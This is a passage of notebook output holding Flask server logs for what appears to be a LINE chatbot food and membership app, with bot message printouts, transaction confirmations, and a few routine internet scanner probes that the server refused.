      "192.168.224.4 - - [14/Mar/2019 08:40:33] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:40:35] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:40:36] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:40:37] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:31] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:32] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:34] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:36] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:37] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:38] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:39] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:41] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:42] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:43] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:45] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:46] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:47] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:49] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:50] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:53] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:55] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:56] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:58] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:42:59] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:43:00] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:43:02] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:43:03] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:43:04] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:43:06] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:43:07] \"GET /welcom HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 08:43:09] \"GET /welcom HTTP/1.1\" 200 -\n",
      "189.137.144.51 - - [14/Mar/2019 09:11:34] \"GET / HTTP/1.1\" 405 -\n",
      "192.168.224.4 - - [14/Mar/2019 09:26:18] \"GET /food/U7173dc299af6ac3fe7697a75c2a280ad.jpg HTTP/1.1\" 200 -\n",
      "47.89.192.12 - - [14/Mar/2019 09:34:36] \"GET / HTTP/1.1\" 405 -\n",
      "5.8.10.202 - - [14/Mar/2019 10:05:16] \"GET /vendor/phpunit/phpunit/README.md HTTP/1.1\" 404 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:17:26] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:17:28] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:17:42] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:17:44] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:17:58] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:17:59] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:18:25] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:18:50] \"GET /memberTransaction HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:18:56] \"GET /productStorage HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 10:30:17] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:33:12] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:33:16] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:33:19] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:33:21] \"GET /productStorage HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:33:23] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:33:25] \"GET /memberInformation HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:33:27] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:33:29] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:33:32] \"GET /administrator HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 10:33:46] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:35:58] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:36:00] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 10:36:06] \"GET /administrator HTTP/1.1\" 200 -\n",
      "5.8.10.202 - - [14/Mar/2019 11:17:14] \"GET / HTTP/1.1\" 405 -\n",
      "192.168.224.4 - - [14/Mar/2019 11:17:24] \"GET /pushMessage/U30256c6d3c01f118f8c96f05e1f0f094 HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 11:17:25] \"GET /pushMessage/U30256c6d3c01f118f8c96f05e1f0f094 HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 11:17:29] \"GET /pushMessage/U23d091bfdaacf722fa39f82776b3c410 HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 11:17:30] \"GET /pushMessage/U23d091bfdaacf722fa39f82776b3c410 HTTP/1.1\" 200 -\n",
      "80.74.75.67 - - [14/Mar/2019 13:09:19] \"GET /manager/html HTTP/1.1\" 404 -\n",
      "216.245.197.254 - - [14/Mar/2019 13:40:33] \"HEAD /robots.txt HTTP/1.0\" 404 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 14:22:20] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 14:22:34] \"GET /pushMessage/U30256c6d3c01f118f8c96f05e1f0f094 HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 14:22:38] \"POST /pushMessage/U30256c6d3c01f118f8c96f05e1f0f094 HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 14:22:42] \"POST /pushMessage/U30256c6d3c01f118f8c96f05e1f0f094 HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 14:22:48] \"POST /pushMessage/U30256c6d3c01f118f8c96f05e1f0f094 HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 14:22:55] \"POST /pushMessage/U30256c6d3c01f118f8c96f05e1f0f094 HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 14:27:43] \"GET /transaction_commit/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 14:27:46] \"GET /transaction_commit/Udf8f1c512878156d2bf8d0051d4f2429 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : Udf8f1c512878156d2bf8d0051d4f2429\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 14:27:52] \"GET /transaction/U7173dc299af6ac3fe7697a75c2a280ad/2019-03-14%2022:27:44 HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 14:27:55] \"GET /transaction_commit/U1e91bf35eb5315bc17da624e46a65c51 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U1e91bf35eb5315bc17da624e46a65c51\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 14:28:01] \"GET /transaction_commit/Uaefa84530bef60672e135c6cee89341d HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : Uaefa84530bef60672e135c6cee89341d\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 14:28:09] \"GET /transaction_commit/U9a1715c6ffdf0ef2ffe148726d336011 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U9a1715c6ffdf0ef2ffe148726d336011\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 14:28:13] \"GET /transaction_commit/Ua0ac6b70d3611ea9d3d4665941dbf3f7 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : Ua0ac6b70d3611ea9d3d4665941dbf3f7\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 14:28:20] \"GET /transaction_commit/U30256c6d3c01f118f8c96f05e1f0f094 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U30256c6d3c01f118f8c96f05e1f0f094\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 14:28:29] \"GET /transaction_commit/U934211376c8da4cc677c3b801bd9f8db HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U934211376c8da4cc677c3b801bd9f8db\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 14:28:33] \"GET /transaction_commit/U26c1d062b5768c0ab8721698973d67b1 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U26c1d062b5768c0ab8721698973d67b1\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "185.221.253.177 - - [14/Mar/2019 14:39:50] \"GET / HTTP/1.1\" 405 -\n",
      "41.60.234.118 - - [14/Mar/2019 15:26:00] \"GET / HTTP/1.1\" 405 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 15:27:19] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 15:27:22] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 15:27:24] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 15:50:51] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 15:52:23] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 15:53:40] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 15:53:41] \"POST / HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Error  U7173dc299af6ac3fe7697a75c2a280ad  existed.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 15:53:43] \"GET /food/U7173dc299af6ac3fe7697a75c2a280ad.jpg HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 16:01:52] \"GET /transaction_commit/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 16:01:54] \"GET /transaction_commit/Udf8f1c512878156d2bf8d0051d4f2429 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : Udf8f1c512878156d2bf8d0051d4f2429\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 16:01:57] \"GET /transaction_commit/U1e91bf35eb5315bc17da624e46a65c51 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U1e91bf35eb5315bc17da624e46a65c51\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 16:02:07] \"GET /transaction_commit/Uaefa84530bef60672e135c6cee89341d HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : Uaefa84530bef60672e135c6cee89341d\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 16:02:12] \"GET /transaction_commit/U9a1715c6ffdf0ef2ffe148726d336011 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U9a1715c6ffdf0ef2ffe148726d336011\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 16:02:19] \"GET /transaction_commit/Ua0ac6b70d3611ea9d3d4665941dbf3f7 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : Ua0ac6b70d3611ea9d3d4665941dbf3f7\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 16:02:22] \"GET /transaction_commit/U30256c6d3c01f118f8c96f05e1f0f094 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U30256c6d3c01f118f8c96f05e1f0f094\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 16:02:30] \"GET /transaction_commit/U934211376c8da4cc677c3b801bd9f8db HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U934211376c8da4cc677c3b801bd9f8db\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 16:02:34] \"GET /transaction_commit/U26c1d062b5768c0ab8721698973d67b1 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U26c1d062b5768c0ab8721698973d67b1\n",
      "Transaction Completed!\n",
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 16:15:55] \"POST / HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]歷史交易\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 16:15:58] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 16:16:04] \"GET /transaction/U7173dc299af6ac3fe7697a75c2a280ad/2019-03-15%2000:01:52 HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [14/Mar/2019 16:16:05] \"GET /food/web_js_css/flexslider.css HTTP/1.1\" 304 -\n",
      "192.168.224.4 - - [14/Mar/2019 16:16:05] \"GET /food/web_js_css/jquery.flexslider.js HTTP/1.1\" 304 -\n",
      "192.168.224.4 - - [14/Mar/2019 16:16:05] \"GET /food/logo.png HTTP/1.1\" 304 -\n",
      "192.168.224.4 - - [14/Mar/2019 16:16:05] \"GET /food/web_js_css/jquery.min.js HTTP/1.1\" 304 -\n",
      "192.168.224.4 - - [14/Mar/2019 16:16:06] \"GET /food/web_js_css/fonts/flexslider-icon.woff HTTP/1.1\" 304 -\n",
      "192.168.224.4 - - [14/Mar/2019 16:45:38] \"GET /food/Uaefa84530bef60672e135c6cee89341d.jpg HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 17:25:33] \"POST / HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]歷史交易\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 17:25:36] \"POST / HTTP/1.1\" 200 -\n",
      "186.116.130.178 - - [14/Mar/2019 17:50:06] \"GET / HTTP/1.1\" 405 -\n",
      "211.23.154.136 - - [14/Mar/2019 17:52:25] \"GET / HTTP/1.1\" 405 -\n",
      "198.20.103.242 - - [14/Mar/2019 18:16:44] \"GET / HTTP/1.1\" 405 -\n",
      "194.61.24.217 - - [14/Mar/2019 18:30:33] code 400, message Bad HTTP/0.9 request type ('\\x03\\x00\\x00/*à\\x00\\x00\\x00\\x00\\x00Cookie:')\n",
      "194.61.24.217 - - [14/Mar/2019 18:30:33] \"\u0003\u0000\u0000/*à\u0000\u0000\u0000\u0000\u0000Cookie: mstshash=Administr\" HTTPStatus.BAD_REQUEST -\n",
      "138.99.101.198 - - [14/Mar/2019 19:18:41] \"GET / HTTP/1.1\" 405 -\n",
      "185.53.91.50 - - [14/Mar/2019 19:25:43] \"GET /admin/assets/js/views/login.js HTTP/1.1\" 404 -\n",
      "69.163.152.106 - - [14/Mar/2019 19:44:05] \"HEAD / HTTP/1.0\" 405 -\n",
      "196.52.43.120 - - [14/Mar/2019 19:49:39] \"GET / HTTP/1.0\" 405 -\n",
      "77.159.94.127 - - [14/Mar/2019 21:16:06] \"GET / HTTP/1.1\" 405 -\n",
      "192.168.224.4 - - [14/Mar/2019 21:32:59] \"GET /transaction_commit/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 21:33:04] \"GET /transaction_commit/Udf8f1c512878156d2bf8d0051d4f2429 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : Udf8f1c512878156d2bf8d0051d4f2429\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 21:33:09] \"GET /transaction_commit/U1e91bf35eb5315bc17da624e46a65c51 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U1e91bf35eb5315bc17da624e46a65c51\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 21:33:14] \"GET /transaction_commit/Uaefa84530bef60672e135c6cee89341d HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : Uaefa84530bef60672e135c6cee89341d\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 21:33:24] \"GET /transaction_commit/U9a1715c6ffdf0ef2ffe148726d336011 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U9a1715c6ffdf0ef2ffe148726d336011\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 21:33:30] \"GET /transaction_commit/Ua0ac6b70d3611ea9d3d4665941dbf3f7 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : Ua0ac6b70d3611ea9d3d4665941dbf3f7\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 21:33:39] \"GET /transaction_commit/U30256c6d3c01f118f8c96f05e1f0f094 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U30256c6d3c01f118f8c96f05e1f0f094\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 21:33:45] \"GET /transaction_commit/U934211376c8da4cc677c3b801bd9f8db HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U934211376c8da4cc677c3b801bd9f8db\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [14/Mar/2019 21:33:55] \"GET /transaction_commit/U26c1d062b5768c0ab8721698973d67b1 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U26c1d062b5768c0ab8721698973d67b1\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "89.248.169.12 - - [14/Mar/2019 22:16:31] \"GET / HTTP/1.1\" 405 -\n",
      "45.6.195.199 - - [14/Mar/2019 22:34:01] \"GET / HTTP/1.1\" 405 -\n",
      "186.212.105.39 - - [14/Mar/2019 23:45:53] \"GET / HTTP/1.1\" 405 -\n",
      "192.168.224.4 - - [15/Mar/2019 00:04:52] \"GET /food/logo.png HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U9a1715c6ffdf0ef2ffe148726d336011\n",
      "    UserName : Yiying\n",
      "    Said : [::text:]歷史交易\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U9a1715c6ffdf0ef2ffe148726d336011\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [15/Mar/2019 00:19:01] \"POST / HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [15/Mar/2019 01:05:55] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [15/Mar/2019 01:05:58] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [15/Mar/2019 01:07:15] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [15/Mar/2019 01:10:04] \"GET /administrator HTTP/1.1\" 200 -\n",
      "2.181.22.38 - - [15/Mar/2019 01:13:00] \"GET / HTTP/1.1\" 405 -\n",
      "103.87.48.16 - - [15/Mar/2019 01:18:04] \"GET / HTTP/1.1\" 405 -\n",
      "192.168.224.4 - - [15/Mar/2019 01:49:37] \"GET /pushMessage/U9a1715c6ffdf0ef2ffe148726d336011 HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [15/Mar/2019 01:49:38] \"GET /pushMessage/U9a1715c6ffdf0ef2ffe148726d336011 HTTP/1.1\" 200 -\n",
      "124.41.215.120 - - [15/Mar/2019 02:05:10] \"GET / HTTP/1.1\" 405 -\n",
      "69.163.152.106 - - [15/Mar/2019 03:19:56] \"HEAD / HTTP/1.0\" 405 -\n",
      "139.162.119.197 - - [15/Mar/2019 04:10:22] \"GET / HTTP/1.1\" 405 -\n",
      "18.203.235.226 - - [15/Mar/2019 04:12:50] \"GET / HTTP/1.1\" 405 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
